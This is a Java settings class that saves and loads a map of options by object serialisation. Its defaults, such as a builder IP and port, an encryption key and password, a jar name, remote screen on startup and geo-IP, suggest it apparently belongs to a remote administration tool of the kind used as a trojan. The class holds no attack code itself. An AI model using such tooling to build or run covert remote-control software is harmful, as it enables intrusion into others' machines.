package com.redpois0n;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

import javax.swing.UIManager;

import com.redpois0n.io.Files;

public class Settings {

	private static HashMap<String, Object> settings = new HashMap<String, Object>();

	public static String get(String key) {
		Object obj = settings.get(key);
		return obj == null ? "" : (String)obj;
	}
	
	public static int getInt(String key) {
		Object obj = settings.get(key);
		return obj == null ? -1 : (Integer)obj;
	}
	
	public static boolean getBoolean(String key) {
		Object obj = settings.get(key);
		return obj == null ? false : (Boolean)obj;
	}

	public static void setVal(String key, Object value) {
		settings.put(key, value);
	}

	@SuppressWarnings("unchecked")
	public static void load() {
		try {
			ObjectInputStream str = new ObjectInputStream(new FileInputStream(new File(Files.getSettings(), "settings.dat")));
			settings = (HashMap<String, Object>) str.readObject();
			str.close();		
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		if (settings.size() == 0) {
			addDefault();
		}
	}

	public static void save() {
		try {
			ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(new File(Files.getSettings(), "settings.dat")));
			str.writeObject(settings);
			str.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void addDefault() {
		Settings.setVal("bip", "127.0.0.1");
		Settings.setVal("bport", 1336);
		Settings.setVal("bid", "Name");
		Settings.setVal("bkey", "enckey");
		Settings.setVal("bpass", "pass");
		Settings.setVal("bcrypt", true);
		Settings.setVal("brecat", 10);
		Settings.setVal("traynote", true);
		Settings.setVal("soundondc", false);
		Settings.setVal("soundonc", false);
		Settings.setVal("stats", true);
		Settings.setVal("jarname", "File");
		Settings.setVal("autologin", false);
		Settings.setVal("remotescreenstartup", false);
		Settings.setVal("theme", UIManager.getSystemLookAndFeelClassName());
		Settings.setVal("askurl", true);
		Settings.setVal("max", -1);
		Settings.setVal("geoip", false);
		Settings.setVal("encryption", true);
	}

}
